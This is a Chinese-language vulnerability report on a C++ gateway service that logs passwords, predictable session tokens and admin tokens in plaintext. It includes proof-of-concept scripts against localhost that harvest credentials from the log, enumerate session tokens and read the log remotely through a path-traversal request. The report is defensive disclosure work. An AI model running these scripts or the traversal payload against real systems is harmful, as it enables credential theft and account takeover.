# VULN-SEC-XMOD-003: 跨模块审计日志凭据泄露链，密码与会话令牌明文持久化

**严重性**: High | **CWE**: CWE-532 (Information Exposure Through Log Files) | **置信度**: 85/100
**位置**: `src/main.cpp:43-50` @ `lambda(POST /login)`

---

## 1. 漏洞细节

本漏洞是一条**跨模块凭据泄露链**，涉及 4 个模块（http_server、main、audit_log、user_store），通过 3 个独立的泄露点将敏感凭据明文写入持久化日志文件。

**泄露点 1 — 用户密码明文泄露（main.cpp:43）**：
`POST /login` 路由处理函数将完整的 `request.body`（包含 HTTP POST 请求体）作为 `detail` 参数传递给 `AuditLog::event()`。当客户端在 POST 请求体中提交凭据（如表单 `user=alice&password=wonderland`）时，密码明文被原样写入日志文件 `edge-gateway.audit.log`。即使客户端通过 URL 查询字符串传递凭据，任何 POST 请求体内容都会被无条件记录。

**泄露点 2 — 会话令牌明文泄露（main.cpp:50）**：
用户认证成功后，`UserStore::issueSession()` 生成格式为 `sess-{username}-{unix_timestamp}` 的会话令牌，该令牌被直接传递给 `audit.event()` 写入日志。令牌格式高度可预测——攻击者只需知道用户名和大致登录时间即可枚举有效令牌。

**泄露点 3 — 管理员令牌明文泄露（main.cpp:72）**：
`GET /admin/export` 路由将管理员导出令牌（通过 URL 查询参数 `token` 传入）原样记录到审计日志中。

**根本原因**：`AuditLog::event()` 函数（audit_log.hpp:11-14）直接将 `detail` 参数写入 `ofstream`，**无任何脱敏、过滤或掩码处理**。整个代码库中不存在任何 `sanitize`、`filter`、`mask`、`redact` 等安全函数（已通过全局搜索确认）。

## 2. 漏洞代码

### 泄露点 1 & 2：登录路由（密码 + 会话令牌）

**文件**: `src/main.cpp` (行 40-52)

```cpp
server.route("POST", "/login", [&](const HttpRequest& request) {
    std::string username = queryValue(request, "user");
    std::string password = queryValue(request, "password");
    audit.event(username, "login-attempt", request.body);  // ← 泄露点1: POST body 含密码明文

    if (!users.authenticate(username, password)) {
      return text(401, "invalid credentials\n");
    }

    std::string token = users.issueSession(username);
    audit.event(username, "login-success", token);  // ← 泄露点2: 会话令牌明文
    return text(200, "session=" + token + "\n");
});
```

**分析**：第 43 行将 `request.body`（完整的 POST 请求体）直接传给审计日志。第 50 行将 `issueSession()` 生成的可预测令牌直接写入日志。两处调用均无任何脱敏处理。

### 泄露点 3：管理员导出路由

**文件**: `src/main.cpp` (行 70-74)

```cpp
server.route("GET", "/admin/export", [&](const HttpRequest& request) {
    std::string token = queryValue(request, "token");
    audit.event("admin", "export", token);  // ← 泄露点3: 管理员令牌明文
    return text(200, files.exportSnapshot(token));
});
```

**分析**：第 72 行将管理员令牌原样记录到审计日志中。

### 数据汇聚点：审计日志写入

**文件**: `include/audit_log.hpp` (行 7-18)

```cpp
class AuditLog {
 public:
  explicit AuditLog(const std::string& path) : out_(path, std::ios::app) {}

  void event(const std::string& user, const std::string& action, const std::string& detail) {
    out_ << std::time(nullptr) << " user=" << user
         << " action=" << action
         << " detail=" << detail << "\n";  // ← 直接写入，无任何脱敏
  }

 private:
  std::ofstream out_;
};
```

**分析**：`event()` 方法将 `detail` 参数直接拼接写入文件流，无任何安全检查、字段过滤或敏感信息掩码。日志文件以追加模式（`std::ios::app`）打开，所有记录永久保留。

### 可预测令牌生成

**文件**: `src/user_store.cpp` (行 33-36)

```cpp
std::string UserStore::issueSession(const std::string& username) const {
  char token[32];
  std::sprintf(token, "sess-%s-%ld", username.c_str(), static_cast<long>(std::time(nullptr)));
  return token;
}
```

**分析**：令牌格式为 `sess-{用户名}-{Unix时间戳}`，完全可预测。攻击者知道用户名和大致登录时间即可暴力枚举有效令牌。

### 网络数据接收

**文件**: `src/http_server.cpp` (行 105-128)

```cpp
for (;;) {
    int client = accept(fd, nullptr, nullptr);  // ← 接受任意远程连接
    if (client < 0) { continue; }

    char buffer[4096];
    std::memset(buffer, 0, sizeof(buffer));
    ssize_t n = recv(client, buffer, sizeof(buffer) - 1, 0);  // ← 接收原始 HTTP 数据
    if (n <= 0) { close(client); continue; }

    HttpRequest request = parseRequest(std::string(buffer, static_cast<size_t>(n)));
    auto handler = handlers_.find(routeKey(request.method, request.path));

    HttpResponse response;
    if (handler == handlers_.end()) {
      response.status = 404;
      response.body = "not found\n";
    } else {
      response = handler->second(request);  // ← 调用路由处理函数，传递完整 request
    }
    // ...
}
```

**分析**：TCP 套接字绑定到 `INADDR_ANY`（0.0.0.0），接受来自任意远程主机的连接。`recv()` 读取的原始数据经 `parseRequest()` 解析后，`request.body` 保留了完整的 POST 请求体内容，未经任何过滤即传递给路由处理函数。

## 3. 完整攻击链路

### 链路 A：密码明文泄露

```
[入口点] HttpServer::run()@src/http_server.cpp:106
  ↓ accept() 接受远程 TCP 连接（INADDR_ANY:8080，无认证）
[数据接收] recv()@src/http_server.cpp:113
  ↓ 读取原始 HTTP 请求数据到 4096 字节缓冲区
[请求解析] parseRequest()@src/http_server.cpp:42-69
  ↓ 解析 HTTP 请求，POST body 存入 request.body（行 65-67）
[路由分发] handler->second(request)@src/http_server.cpp:127
  ↓ 将完整 HttpRequest 对象传递给 POST /login 处理函数
[漏洞触发] audit.event(username, "login-attempt", request.body)@src/main.cpp:43
  ↓ request.body（含密码明文）作为 detail 参数传入
[持久化] AuditLog::event()@include/audit_log.hpp:11-14
  ↓ ofstream 直接写入 detail 字段，无脱敏
[泄露终点] edge-gateway.audit.log 文件
```

### 链路 B：会话令牌泄露

```
[入口点] HttpServer::run()@src/http_server.cpp:106
  ↓ 同上链路 A 步骤 1-4
[令牌生成] users.issueSession(username)@src/user_store.cpp:33-36
  ↓ 生成可预测令牌 "sess-{user}-{timestamp}"
[漏洞触发] audit.event(username, "login-success", token)@src/main.cpp:50
  ↓ 会话令牌作为 detail 参数传入
[持久化] AuditLog::event()@include/audit_log.hpp:11-14
  ↓ 直接写入日志文件
[泄露终点] edge-gateway.audit.log 文件
```

### 链路 C：管理员令牌泄露

```
[入口点] HttpServer::run()@src/http_server.cpp:106
  ↓ 同上步骤 1-3
[路由分发] handler->second(request)@src/http_server.cpp:127
  ↓ GET /admin/export?token=xxx 路由处理
[漏洞触发] audit.event("admin", "export", token)@src/main.cpp:72
  ↓ 管理员令牌作为 detail 参数传入
[持久化] AuditLog::event()@include/audit_log.hpp:11-14
[泄露终点] edge-gateway.audit.log 文件
```

**链路完整性验证**：

- **每一步均可达**：`accept()` → `recv()` → `parseRequest()` → handler dispatch → `audit.event()` → `ofstream` 是线性执行路径，无条件分支阻断
- **无数据清洗**：已通过全局搜索确认代码库中不存在 `sanitize`、`filter`、`mask`、`redact`、`escape` 等函数
- **无条件触发**：每次登录尝试都会触发 body 日志记录（行 43），成功登录无条件记录令牌（行 50），导出操作无条件记录令牌（行 72）

## 4. 攻击场景

**攻击者画像**: 具有日志文件读取能力的本地用户、同一主机上的其他进程、或通过其他漏洞（如路径遍历）可读取服务器文件系统的远程攻击者。

**攻击向量**: 被动信息收集 — 攻击者无需主动触发漏洞，只需读取日志文件即可获取凭据。漏洞在正常业务操作（用户登录、管理员导出）中自动触发。

**利用难度**: 低

### 攻击步骤

1. **等待正常业务流量**：用户通过 `POST /login` 登录系统，管理员通过 `GET /admin/export` 执行导出操作
2. **读取日志文件**：攻击者通过以下任一方式获取 `edge-gateway.audit.log`：
   - 本地文件系统直接读取（如果有服务器访问权限）
   - 利用路径遍历漏洞（`GET /files?name=../edge-gateway.audit.log`）远程读取
   - 通过日志收集工具或 syslog 转发获取
3. **提取凭据**：从日志记录中提取：
   - 用户密码明文（来自 `detail=user=xxx&password=yyy`）
   - 有效会话令牌（来自 `detail=sess-alice-1718700000`）
   - 管理员导出令牌（来自 `detail={admin_token}`）
4. **利用窃取的凭据**：
   - 使用窃取的密码直接登录任意用户账户
   - 使用窃取的会话令牌冒充已登录用户
   - 使用窃取的管理员令牌访问导出功能

## 5. 攻击条件

| 条件类型   | 要求           | 说明                                                                                       |
| ---------- | -------------- | ------------------------------------------------------------------------------------------ |
| 网络可达性 | 日志文件可读取 | 攻击者需要能读取 `edge-gateway.audit.log` 文件。可通过本地访问或路径遍历漏洞远程读取       |
| 认证要求   | 无             | 读取日志不需要任何认证。漏洞触发本身由正常用户操作产生，攻击者只需被动获取日志             |
| 配置依赖   | 默认配置即可   | 日志文件路径 `edge-gateway.audit.log` 硬编码在 main.cpp:33，默认配置下即生效               |
| 环境依赖   | 无特殊要求     | 任何操作系统和编译选项下均存在此漏洞，因为它是逻辑层面的凭据泄露，不依赖内存布局或编译选项 |
| 时序条件   | 无             | 每次登录和导出操作都会触发日志记录，无竞态条件依赖                                         |

## 6. 造成影响

| 影响维度 | 等级 | 说明                                                                                                         |
| -------- | ---- | ------------------------------------------------------------------------------------------------------------ |
| 机密性   | 高   | 用户密码明文、会话令牌、管理员令牌全部泄露到日志文件。攻击者可获取所有登录用户的凭据和有效会话               |
| 完整性   | 高   | 窃取的会话令牌和管理员令牌可用于冒充合法用户执行操作（包括管理员导出功能），导致数据被未授权篡改或导出       |
| 可用性   | 中   | 攻击者获取管理员权限后可能影响服务可用性；此外密码泄露可能导致大规模账户接管，间接影响服务正常运行           |

**影响范围**: 全局影响。所有通过该系统认证的用户凭据均被泄露，管理员令牌泄露可导致整个系统被接管。结合令牌可预测性（`sess-{user}-{timestamp}`），攻击者甚至可以在不读取日志的情况下通过暴力枚举猜测有效会话令牌。

**横向扩展风险**: 如果用户在其他系统使用相同密码（密码复用），泄露的密码可用于攻击其他系统。

## 7. PoC (概念验证)

> ⚠️ 以下 PoC 仅供安全测试和验证使用

### PoC 1：触发密码泄露并验证日志内容

```bash
#!/bin/bash
# PoC: 验证凭据泄露到审计日志
# 仅供安全测试使用

TARGET="http://localhost:8080"
LOG_FILE="edge-gateway.audit.log"

# 步骤1: 记录日志文件初始状态
echo "=== 日志文件初始状态 ==="
wc -l "$LOG_FILE" 2>/dev/null || echo "(文件不存在)"

# 步骤2: 模拟用户登录（POST body 中包含密码）
echo ""
echo "=== 发送登录请求 ==="
curl -s -X POST "${TARGET}/login?user=alice&password=wonderland" \
  -d "user=alice&password=wonderland"
echo ""

# 步骤3: 模拟管理员导出操作
echo ""
echo "=== 发送管理员导出请求 ==="
curl -s "${TARGET}/admin/export?token=super-secret-admin-token"
echo ""

# 步骤4: 检查日志文件中的泄露内容
echo ""
echo "=== 日志文件泄露内容 ==="
cat "$LOG_FILE"
echo ""
echo "=== 提取的敏感信息 ==="
grep "password" "$LOG_FILE" && echo "[!] 密码明文已泄露到日志"
grep "sess-" "$LOG_FILE" && echo "[!] 会话令牌已泄露到日志"
grep "export" "$LOG_FILE" && echo "[!] 管理员令牌已泄露到日志"
```

### PoC 2：利用窃取的会话令牌进行会话劫持

```python
#!/usr/bin/env python3
"""
PoC: 利用日志泄露的会话令牌进行会话劫持
仅供安全测试使用
"""
import requests
import time

TARGET = "http://localhost:8080"

# 步骤1: 正常登录，触发令牌泄露
print("[1] 发送登录请求，触发令牌生成和日志记录...")
resp = requests.post(f"{TARGET}/login?user=alice&password=wonderland")
print(f"    登录响应: {resp.text.strip()}")

# 步骤2: 读取日志文件获取泄露的令牌
# (实际攻击中通过路径遍历或本地访问获取)
print("\n[2] 读取审计日志提取泄露的令牌...")
with open("edge-gateway.audit.log", "r") as f:
    for line in f:
        if "login-success" in line:
            # 提取 detail= 后的令牌
            token = line.split("detail=")[-1].strip()
            print(f"    泄露的令牌: {token}")

# 步骤3: 利用令牌格式的可预测性
print("\n[3] 利用令牌可预测性生成候选令牌...")
current_ts = int(time.time())
for offset in range(-60, 61):
    candidate = f"sess-alice-{current_ts + offset}"
    print(f"    候选: {candidate}")
```

### PoC 3：通过路径遍历远程读取日志文件

```bash
#!/bin/bash
# PoC: 通过路径遍历漏洞远程读取审计日志
# 仅供安全测试使用

TARGET="http://localhost:8080"

echo "=== 通过路径遍历远程读取审计日志 ==="
curl -s "${TARGET}/files?name=../edge-gateway.audit.log"
echo ""
echo "=== 从远程日志中提取凭据 ==="
curl -s "${TARGET}/files?name=../edge-gateway.audit.log" | grep -E "password|sess-|token"
```

**使用说明**: 

1. 启动 edge-gateway 服务：`./edge-gateway 8080`
2. 执行 PoC 1 脚本触发凭据泄露
3. 检查 `edge-gateway.audit.log` 文件验证凭据是否被明文记录
4. 执行 PoC 3 验证是否可通过路径遍历远程获取日志

**预期结果**: 

日志文件中将出现如下记录，包含明文密码和令牌：
```
1718700000 user=alice action=login-attempt detail=user=alice&password=wonderland
1718700000 user=alice action=login-success detail=sess-alice-1718700000
1718700000 user=admin action=export detail=super-secret-admin-token
```

## 8. 验证环境搭建

### 基础环境

- 操作系统: Linux（任意发行版，如 Ubuntu 20.04+）
- 编译器: g++ 9.0+ 或 clang++ 10.0+（支持 C++17）
- 依赖: 标准 C++ 库，无第三方依赖
- 工具: curl（用于发送 HTTP 请求）

### 构建步骤

```bash
# 克隆项目后进入目录
cd /scan/project

# 编译项目
g++ -std=c++17 -O0 -g \
  -I include/ \
  src/main.cpp \
  src/http_server.cpp \
  src/user_store.cpp \
  src/file_cache.cpp \
  src/diagnostics.cpp \
  -o edge-gateway
```

### 运行配置

```bash
# 创建数据目录（FileCache 需要）
mkdir -p data

# 启动服务（默认端口 8080）
./edge-gateway 8080

# 日志文件将自动创建在当前工作目录
# 文件路径: edge-gateway.audit.log
```

### 验证步骤

1. 启动服务：`./edge-gateway 8080`
2. 在另一个终端发送登录请求：
   ```bash
   curl -X POST "http://localhost:8080/login?user=alice&password=wonderland" \
     -d "user=alice&password=wonderland"
   ```
3. 发送管理员导出请求：
   ```bash
   curl "http://localhost:8080/admin/export?token=test-admin-token"
   ```
4. 检查日志文件：
   ```bash
   cat edge-gateway.audit.log
   ```
5. 验证日志中包含明文密码、会话令牌和管理员令牌

### 预期结果

日志文件 `edge-gateway.audit.log` 将包含以下格式的记录：

```
{timestamp} user=alice action=login-attempt detail=user=alice&password=wonderland
{timestamp} user=alice action=login-success detail=sess-alice-{timestamp}
{timestamp} user=admin action=export detail=test-admin-token
```

其中：
- `detail` 字段包含完整的 POST 请求体（含密码明文）
- `detail` 字段包含可预测的会话令牌
- `detail` 字段包含管理员令牌明文

**这证实了 CWE-532（通过日志文件泄露信息）漏洞的存在，且涉及跨 4 个模块的完整凭据泄露链。**
